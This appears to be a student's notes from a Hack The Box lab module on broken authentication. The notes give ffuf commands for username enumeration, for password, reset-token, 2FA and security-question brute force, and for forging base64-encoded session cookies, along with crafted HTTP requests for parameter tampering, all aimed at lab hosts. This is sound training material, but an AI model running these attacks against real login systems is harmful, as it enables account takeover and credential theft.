---
aliases:
  - Broken Authentication
---
# Broken Authentication

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FG90sVpk2POxTyWaIQF09%2Fimage.png?alt=media&amp;token=a681436d-682f-4779-81b3-f02863dc7b8b" alt=""><figcaption></figcaption></figure>

On the other hand, a valid username results in a different error message:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FcvyK1s71O7Mfua10LPMm%2Fimage.png?alt=media&amp;token=40b5d147-0af3-4beb-8458-a5ff616a94fb" alt=""><figcaption></figcaption></figure>

### Enumerating Users via Differing Error Messages

{% embed url="<https://github.com/danielmiessler/SecLists/tree/master/Usernames>" %}

&#x20;attempt to log in to the lab with an invalid username such as `abc`, we can see the following error message:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0oQEp2HcbzzMSGVGzKGn%2Fimage.png?alt=media&amp;token=724a4fdd-d6c5-432b-8f83-fbe51829e7e7" alt=""><figcaption></figcaption></figure>

&#x20;`htb-stdnt` and an invalid password

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqjtkOVpSR7h2nM3LT2DO%2Fimage.png?alt=media&amp;token=6af0cb58-75ca-466c-89ce-111cf8dc3313" alt=""><figcaption></figcaption></figure>

```shell-session
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

## 2.Brute-Forcing Passwords

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FOfdviC1SkHDoT7ymTvpe%2Fimage.png?alt=media&amp;token=9bb9a47e-c8d7-413c-b9de-c2dc308bf4b5" alt=""><figcaption></figcaption></figure>

```shell-session
wc -l /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

```shell-session
grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

```shell-session
wc -l custom_wordlist.txt
```

```shell-session
ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

## 3.Brute-Forcing Password Reset Tokens

```
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this e-mail.

Thank you.
```

## Attacking Weak Reset Tokens

```shell-session
seq -w 0 9999 > tokens.txt
```

```shell-session
head tokens.txt
```

```shell-session
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FiqtMl2KM8imWkvwRdqxP%2Fimage.png?alt=media&amp;token=7217e91a-e84b-4099-8b96-a2dd166fdd0c" alt=""><figcaption></figcaption></figure>

## 4.Brute-Forcing 2FA Codes

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FJ7BTVCIWHIetyRZJdL4R%2Fimage.png?alt=media&amp;token=65601211-5a9c-48fe-9712-63f2a34e31f7" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FEjvSlmUOWRi7EyScwaN4%2Fimage.png?alt=media&amp;token=0a3c3fc8-d566-44de-bf0d-06815c855f4b" alt=""><figcaption></figcaption></figure>

```shell-session
seq -w 0 9999 > tokens.txt
```

```shell-session
ffuf -w ./tokens.txt -u http://bf_2fa.htb/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=fpfcm5b8dh1ibfa7idg0he7l93" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

## 5.Weak Brute-Force Protection

### Rate Limits

X-Forwarded-For

## CAPTCHAs

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FMhlMJf4zjoFdxvb1sUAz%2Fimage.png?alt=media&amp;token=eb34dbcd-896d-434d-9ace-e9488a8dfbb6" alt=""><figcaption></figcaption></figure>

## 6.Default Credentials

{% embed url="<https://www.cirt.net/passwords>" %}

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F7PsJuMUyUdgdbBL3Jgxb%2Fimage.png?alt=media&amp;token=f255a80b-54c4-48bc-b7a5-ff77f4ee0b4b" alt=""><figcaption></figcaption></figure>

Further resources include [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) as well as the [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master) GitHub repository which contains a list of default passwords for a variety of different vendors.

A targeted internet search is a different way of obtaining default credentials for a web application. Let us assume we stumble across a [BookStack](https://github.com/BookStackApp/BookStack) web application during an engagement:

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FwjHVFkfKUv4nyoouAab6%2Fimage.png?alt=media&amp;token=ca41beaf-5316-48c3-889d-a3cc28c4942d" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FQ85mTy12eNuDL3aFBFVH%2Fimage.png?alt=media&amp;token=f64c724c-f1e2-441f-b6ef-0ffd649e1930" alt=""><figcaption></figcaption></figure>

## 7.Vulnerable Password Reset

* "`What is your mother's maiden name?`"
* "`What city were you born in?`"

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F7leXV6l3V5eaUIhf27Pu%2Fimage.png?alt=media&amp;token=b28cf23a-d635-47ae-af70-0bf06a990d48" alt=""><figcaption></figcaption></figure>

```shell-session
Olanzapine@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

Olanzapine@htb[/htb]$ wc -l city_wordlist.txt 
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2Fu6dAwaAu41P9JWgCGM6f%2Fimage.png?alt=media&amp;token=9efa7647-ddd5-42a9-b8ec-7a54d99e1f5e" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FuGxj3oskMlcEo3UOfA2F%2Fimage.png?alt=media&amp;token=e2cb0cdb-453b-48d6-994b-18e8d77bb94c" alt=""><figcaption></figcaption></figure>

```shell-session
ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FrREhiGkMd6C4fM8Kexbf%2Fimage.png?alt=media&amp;token=96555e4e-1a84-460a-9325-9c81dfc43200" alt=""><figcaption></figcaption></figure>

```shell-session
cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt
```

```shell-session
wc -l german_cities.txt 
```

### Manipulating the Reset Request

hidden parameter abuse

```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5aVYxP9bqrOI5eqfaGmQ%2Fimage.png?alt=media&amp;token=7eee9788-66bc-467e-88c2-351644eb7a08" alt=""><figcaption></figcaption></figure>

## 8.Authentication Bypass via Direct Access

<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F0xmU03VW0hBJTNPba7aQ%2Fimage.png?alt=media&amp;token=7950cd90-497c-440d-9107-546eedcab069" alt=""><figcaption></figcaption></figure>

`302 Found` to `200 OK`

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FgWjhhghXp57YO3GCk2dy%2Fimage.png?alt=media&amp;token=c46fadb7-53ed-4039-8f7c-999636075e2a" alt=""><figcaption></figcaption></figure>

## 9.Authentication Bypass via Parameter Modification

<br>

### Parameter Modification

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FqPoZ9X8PNx0mh8etDFkt%2Fimage.png?alt=media&amp;token=724256cb-5463-432e-81d2-3a5f25a88e48" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FV3hkBZNbBH2b7YRBbn4G%2Fimage.png?alt=media&amp;token=339cafc2-0815-4958-8a34-95410a95ec09" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FoBubS9fsHd0LqPkCfBDS%2Fimage.png?alt=media&amp;token=e3a5ddbd-8b91-47eb-be9f-7614341659d9" alt=""><figcaption></figcaption></figure>

## 10.Attacking Session Tokens

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FFrml4q6Y1kzYjqDb8eSK%2Fimage.png?alt=media&amp;token=a681d565-8f0d-4743-9e9f-57c8cb98d52d" alt=""><figcaption></figcaption></figure>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F563BUB3JZqNdmMkjhU9J%2Fimage.png?alt=media&amp;token=ded194ee-73cb-4c7b-826f-3ddb0193897e" alt=""><figcaption></figcaption></figure>

32 characters long

```
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

Since 28 out of 32 characters are static

```
141233
141234
141237
141238
141240
```

### Attacking Predictable Session Tokens

```shell-session
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FvNvvMChAyOobaz29F3Rg%2Fimage.png?alt=media&amp;token=b508031a-4be8-41f4-8e95-9643c6cb86e1" alt=""><figcaption></figcaption></figure>

```shell-session
echo -n 'user=htb-stdnt;role=admin' | base64
```

<br>

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FEoJzfAWF8dihERSFwmUN%2Fimage.png?alt=media&amp;token=66858670-5db1-486b-8489-9b7370be646f" alt=""><figcaption></figcaption></figure>

```shell-session
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FNa9kyWHhAhkmyfcaNX3E%2Fimage.png?alt=media&amp;token=43d2a05b-0a81-4d24-9481-42b24c62d844" alt=""><figcaption></figcaption></figure>
